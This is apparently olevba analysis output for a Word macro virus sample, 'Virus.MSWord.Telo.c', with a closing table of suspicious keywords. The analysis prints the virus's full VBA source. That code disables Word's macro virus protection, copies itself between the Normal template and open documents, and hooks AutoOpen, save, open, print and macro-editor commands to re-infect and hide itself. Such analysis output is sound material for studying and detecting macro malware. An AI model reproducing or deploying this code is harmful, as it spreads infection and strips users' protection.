olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Telo.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Telo.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO maverick.bas 
in file: Virus.MSWord.Telo.c - OLE stream: 'Macros/VBA/maverick'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Virus()
Attribute Virus.VB_Description = "Ìàêðîñ ñîçäàí 12.04.93 Êóäðÿøîâ "
Attribute Virus.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Virus"

'sexual excitement, create virus. By MAVERICK 16.03.99
    
    On Error Resume Next
    Options.VirusProtection = False
    Application.OrganizerCopy _
        Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument.FullName, _
        Name:="Maverick", _
        Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy _
        Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, _
        Name:="Maverick", _
        Object:=wdOrganizerObjectProjectItems
End Sub
Sub AutoOpen()
    Options.VirusProtection = False
    Application.Run MacroName:="maverick.Virus"

End Sub
Sub FileClose()
' Çàêðûòèå âñåõ îêîí àêòèâíîãî äîêóìåíòà
    On Error Resume Next
    WordBasic.FileClose
    Application.Run MacroName:="maverick.Virus"
End Sub
Sub FileOpen()
' Îòêðûòèå ñóùåñòâóþùåãî äîêóìåíòà èëè øàáëîíà
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Application.Run MacroName:="maverick.Virus"
End Sub
Sub FilePrintDefault()
' Ïå÷àòü àêòèâíîãî äîêóìåíòà ñ èñïîëüçîâàíèåì òåêóùèõ ïàðàìåòðîâ
    On Error Resume Next
    ActiveDocument.PrintOut
    Application.Run MacroName:="maverick.Virus"

End Sub
Sub FileSave()
' Ñîõðàíåíèå àêòèâíîãî äîêóìåíòà èëè øàáëîíà
    On Error Resume Next
    ActiveDocument.Save
    Application.Run MacroName:="maverick.Virus"
End Sub
Sub FileNewDefault()
' Ñîçäàíèå íîâîãî äîêóìåíòà, îñíîâàííîãî íà øàáëîíå ''Îáû÷íûé''
    On Error Resume Next
    Documents.Add
    Application.Run MacroName:="maverick.Virus"
End Sub
Sub FileSaveAs()
' Ñîõðàíåíèå êîïèè äîêóìåíòà â äðóãîé ôàéë
    Dialogs(wdDialogFileSaveAs).Show
    Application.Run MacroName:="maverick.Virus"
End Sub
Sub HelpAbout()
' Âûâîä ñâåäåíèé î ïðîãðàììå, åå âåðñèè è àâòîðñêèõ ïðàâàõ
    On Error Resume Next
    Dialogs(wdDialogHelpAbout).Show
    Application.Run MacroName:="maverick.Virus"
End Sub
Sub Organizer()
' Óïðàâëåíèå ýëåìåíòàìè àâòîòåêñòà, ñòèëÿìè, ìàêðîñàìè è ïàíåëÿìè èíñòðóìåíòîâ
    On Error Resume Next
    'Dialogs(wdDialogOrganizer).Show
    Application.Run MacroName:="maverick.Virus"
End Sub
Sub ToolsMacro()
' Çàïóñê, ñîçäàíèå, óäàëåíèå èëè èçìåíåíèå ìàêðîñà
    On Error Resume Next
    'Dialogs(wdDialogToolsMacro).Show
    Application.Run MacroName:="maverick.Virus"
End Sub
Sub FileTemplates()
' Èçìåíåíèå àêòèâíîãî øàáëîíà
    On Error Resume Next
    'Dialogs(wdDialogToolsTemplates).Show
    Application.Run MacroName:="maverick.Virus"
End Sub
Sub ViewVBCode()
' Îòêðûòèå ðåäàêòîðà Visual Basic
    On Error Resume Next
    'ShowVisualBasicEditor = True
    Application.Run MacroName:="maverick.Virus"
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

